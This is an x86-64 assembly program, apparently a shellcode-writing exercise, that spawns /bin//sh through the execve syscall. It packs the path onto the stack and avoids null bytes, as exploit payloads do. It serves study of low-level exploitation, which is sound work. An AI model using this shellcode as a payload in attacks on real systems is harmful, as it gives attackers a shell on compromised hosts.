; Program: Illustrating a the use of EXECVE syscall by spawning a simple shell, using stack method
; Author: Paramjot Singh
; Alias: belikeParamjot
; Execve:  ->  ADDRESS:NULL:ADDRESS:NULL

global _start

segment .text

_start:
	; Set rax to NULL
	xor rax, rax
	; Pushing Null onto stack
	push rax
	; Pushing the ADDRESS onto the stack
	mov rbx, 0x68732f2f6e69622f
	push rbx
	; Setting RDI
	mov rdi, rsp
	; Pushing NULL
	push rax
	; Setting RDX
	mov rdx, rsp
	; Pushing ADDRESS
	push rdi
	; Setting RSI
	mov rsi, rsp

	; Calling the EXECVE syscall	
	add rax,59
	syscall
